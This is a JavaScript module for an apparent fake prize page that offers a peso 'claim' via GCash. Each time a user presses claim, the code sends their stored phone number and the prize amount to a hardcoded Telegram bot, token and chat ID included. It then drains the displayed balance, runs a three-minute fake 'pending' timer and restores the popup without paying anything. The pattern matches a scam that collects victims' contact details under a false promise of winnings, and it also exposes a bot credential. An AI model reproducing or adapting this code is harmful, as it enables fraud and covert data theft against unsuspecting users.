/**
 * Claim Popup Module - Revised with Countdown & Decrement Animation
 */

let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    countdownSeconds: 180  // 3 minutes = 180 seconds
};

// Show the claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    claimBtn.classList.remove('processing');
    claimBtn.innerHTML = '💰 CLAIM THRU GCASH 💰';
    claimBtn.disabled = false;
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

function showPendingModal() {
    const modal = document.getElementById('pendingModal');
    modal.style.display = 'flex';
}

function hidePendingModal() {
    const modal = document.getElementById('pendingModal');
    modal.style.display = 'none';
}

// Animate balance decreasing from current to 0
function animateBalanceToZero(currentBalance, onComplete) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = currentBalance;
    const step = Math.max(1, Math.floor(currentBalance / 30)); // ~30 steps
    const interval = setInterval(() => {
        current = Math.max(0, current - step);
        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        
        if (current <= 0) {
            clearInterval(interval);
            balanceText.innerText = "₱0.00";
            if (onComplete) onComplete();
        }
    }, 50);
}

// Update countdown timer display
function updateCountdownDisplay(seconds) {
    const timerSpan = document.getElementById('pendingTimer');
    if (!timerSpan) return;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Start countdown (3 minutes)
function startCountdown(onComplete) {
    let remaining = claimState.countdownSeconds;
    updateCountdownDisplay(remaining);
    
    claimState.countdownInterval = setInterval(() => {
        remaining--;
        updateCountdownDisplay(remaining);
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            if (onComplete) onComplete();
        }
    }, 1000);
}

// Main claim action
function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    // Disable button and change text
    claimBtn.disabled = true;
    claimBtn.innerHTML = '⏳ PROCESSING...';
    
    // Send notification to Telegram
    const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    // Close claim popup
    hideClaimPopup();
    
    // Show pending modal with countdown
    showPendingModal();
    
    // Animate balance decreasing to 0
    const currentBalance = amount;
    animateBalanceToZero(currentBalance, () => {
        // Update main game balance to 0 in Firebase
        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
            window.parent.updateGameBalance(0);
        } else if (typeof updateGameBalance === 'function') {
            updateGameBalance(0);
        } else if (typeof GameState !== 'undefined') {
            GameState.balance = 0;
            if (typeof updateUI === 'function') updateUI();
            if (typeof saveData === 'function') saveData();
        }
    });
    
    // Start 3-minute countdown
    startCountdown(() => {
        // Countdown finished - hide pending modal and restore claim button
        hidePendingModal();
        
        // Reset claim state
        claimState.isProcessing = false;
        
        // Restore the original balance (the prize amount)
        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
            window.parent.updateGameBalance(amount);
        } else if (typeof updateGameBalance === 'function') {
            updateGameBalance(amount);
        } else if (typeof GameState !== 'undefined') {
            GameState.balance = amount;
            if (typeof updateUI === 'function') updateUI();
            if (typeof saveData === 'function') saveData();
        }
        
        // Update balance display in main
        const balanceText = document.getElementById('balanceText');
        if (balanceText) {
            balanceText.innerText = "₱" + amount.toLocaleString() + ".00";
        }
        
        // Show claim popup again
        showClaimPopup(amount);
        
        // Send Telegram notification that claim expired
        const expireMsg = `⏰ CLAIM EXPIRED (No Action)!\n📱 ${userPhone}\n💵 ₱${amount}`;
        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(expireMsg)}`)
            .catch(e => console.log('Telegram error:', e));
    });
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
});
